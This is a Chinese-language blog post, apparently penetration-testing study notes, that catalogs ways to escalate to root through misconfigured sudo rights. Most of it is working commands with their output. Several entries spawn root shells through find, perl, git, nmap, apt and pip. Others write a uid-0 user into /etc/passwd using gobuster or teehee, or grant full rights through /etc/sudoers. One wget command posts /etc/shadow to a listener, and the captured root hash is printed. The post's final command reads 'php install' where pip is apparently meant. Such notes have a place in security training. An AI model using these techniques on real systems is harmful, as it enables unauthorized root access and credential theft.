---
title: SUDO 提权
published: 2025-03-09 16:40:49
tags: [内网安全,提权思路]
category: 安全
draft: false
---

# SUDO 提权

> https://blog.csdn.net/negnegil/article/details/120090266#:~:text=sudo%20wget%E6%8F%90#:~:text=sudo%20wget%E6%8F%90
> 

```sql
sudo -l // 查看当前用户可以以sudo运行的命令或者二进制文件
```

## **Sudoer文件语法**

假如我们（root用户）要给普通用户test分配sudo权限，请输出`vim /etc/sudoers`打开文件进行编辑，找到root权限`root ALL=(ALL:ALL) ALL`，在下一行输入
`test ALL=(ALL) NOPASSWD: ALL`，保存后退出，这样即表示用户test可以使用sudo调用root权限执行命令

```sql
// 给普通用户test 的wget命令添加sudo权限供下面进行提权
test   ALL(ALL:ALL) /usr/bin/wget
```

**提权命令总览**

```sql
wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp
```

## gobuster

**不一定要写入`/etc/passwd` ,可以向定时任务中写入，并且可以使用拼接的方式来写入**

例如：我们先创建字典文件`wordlist` ，里面写入`hello` 。

```bash
welcome@listen:/tmp$ cat wordlist 
hello
```

在`kali`创建`hello`文件，并创建简易web服务器

```bash
┌──(root㉿kali)-[~/Desktop/test/buster]
└─# ls
hello

┌──(root㉿kali)-[~/Desktop/test/buster]
└─# php -S 0:81
```

通过`gobuster`扫描`kali` 将输出结果放入到`test`文件

这样就可以将文字输入带文字了，假如我们将其输入到`/etc/passwd`文件呢？

```bash
welcome@listen:/tmp$ gobuster -u http://192.168.56.4:81/ -w wordlist -n -q -o test
/hello
welcome@listen:/tmp$ cat test
/hello
```

我们打算计划向`/etc/passwd`写入`hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash` （长度为`40`） 但是因为会触发交换文件。

所以打算创建`web`服务器，将接收到路径长度`≠40`的数据包都返回`200` ，那么就会输出中写出来

(代码参照：https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83)

```bash
from flask import Flask, Response

app = Flask(__name__)

@app.route('/', defaults={'path': ''})
# 接收所有路径
@app.route('/<path:path>')
# catch_all 处理所有请求
def catch_all(path):
		# 参数path是从url中提取的路径
    if len(path) == 1:
        return Response(status=404)
    else:
        return Response(status=200)

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=81) 
```

启动服务器

```bash
┌──(root㉿kali)-[~/Desktop/test/buster]
└─# python3 a.py
 * Serving Flask app 'a'
 * Debug mode: off
WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.
 * Running on all addresses (0.0.0.0)
 * Running on http://127.0.0.1:81
Press CTRL+C to quit
```

靶机在字典中写入`hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash` ，并使用`gobuster`将其写入`/etc/passwd`

```bash
welcome@listen:/tmp$ echo "hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash" > wordlist
welcome@listen:/tmp$ sudo /usr/bin/gobuster -w wordlist -u http://192.168.56.4:81/ -n -q -fw -o /etc/passwd                                                  
```

切换到到`/hack`用户，密码`123456`

```bash
/hack@listen:/tmp# id
uid=0(/hack) gid=0(root) groups=0(root)
```

## sudo wget

wget 提权的原理是：

使用–post-file参数将/etc/shadow的内容发送到监听IP并保存未hash.txt（kali）

```sql
// 靶机
 sudo /usr/bin/wget --post-file=/etc/shadow 192.168.75.151:1234 
```

```sql
// kali
nc -lvp 1234 > hash.txt
//
listening on [any] 1234 ...
192.168.75.151: inverse host lookup failed: Unknown host
connect to [192.168.75.151] from (UNKNOWN) [192.168.75.151] 54598
^C
===================================================                                                                                                                                                
cat hash.txt
//
POST / HTTP/1.1
Host: 192.168.75.151:1234
User-Agent: Wget/1.21.3
Accept: */*
Accept-Encoding: identity
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 1585

root:$y$j9T$o1EqDobVg.yt.aANkoutR/$AuDYRKpmrToVENA6oX8xVtne.SWhLbanmq8v9gpAOW0:19984:0:99999:7:::
daemon:*:19984:0:99999:7:::
bin:*:19984:0:99999:7:::

```

## sudo find

这里使用“`exec`”来执行`/bin/bash`，以访问`root shell`

```sql
sudo find /home -exec /bin/bash \;
```

## sudo cat

cat 命令用户连接文件并打印到标准输出设备上

在分配了sudo权限后，我们可以查看 `/etc/shadow` 文件中的账号密码，并使用john破解

```sql
sudo cat /etc/shadow > newfile
```

## sudo apt

apt 命令执行需要超级管理员权限(root)。普通用户可调用sudo执行apt

使用方法是，创建一个临时的文件，并在其中构建一个包来调用/bin/bash，然后通过apt-get安装该包

```sql
TF=$(mktemp) 
echo 'Dpkg::Pre-Invoke {"/bin/sh;false"}' > $TF 
sudo apt-get install -c $TF sl
```

## sudo xxd

xxd命令是 二进制显示和处理文件工具，其可以将给定的文件内容生成为十六进制文件，反过来也行

提权原理是使用xxd读取十六进制的`/etc/shadow`文件，并通过管道符连接另一个xdd命令以将十六进制恢复为原文件

```sql
sudo xxd "/etc/shadow" | xxd -r
```

## **sudo perl**

```sql
sudo perl -e 'exec "/bin/bash";'
```

## **sudo git**

```sql
sudo git help config
	!/bin/bash或者！'sh'完成提权
 
sudo git  -p help
	!/bin/bash
```

## sudo teehee

```python
echo "raaj::0:0:::/bin/bash" | sudo teehee -a /etc/passwd
```

按照linux用户机制，如果没有shadow条目，且passwd用户密码条目为空的时候，可以本地直接su空密码登录。所以只需要执行su raaj就可以登录到raaj用户，这个用户因为uid为0，所以也是root权限直接修改

可以给当前用户添加sudo权限

```python
echo "charles ALL=(ALL) NOPASSWD: ALL" | sudo teehee -a /etc/sudoers
```

## sudo nmap

`-script`是可以执行脚本的，指定提权行为的脚本就行

```python
$ echo "os.execute('/bin/sh')" > getshell.nse
echo "os.execute('/bin/sh')" > getshell.nse
$ ls
ls
backups.sh  backups.tar.gz  getshell.nse  test.sh
$ sudo nmap --script=getshell.nse
sudo nmap --script=getshell.nse

Starting Nmap 7.40 ( https://nmap.org ) at 2024-11-03 03:25 AEST
# 
```

## sudo pip

当存在

```python
arsene@LupinOne:/usr/lib/python3.9$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

权限的时候可以利用`pip install`进行本地提权

https://gtfobins.github.io/gtfobins/pip/

```python
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
```

```python
sudo php install $TF
```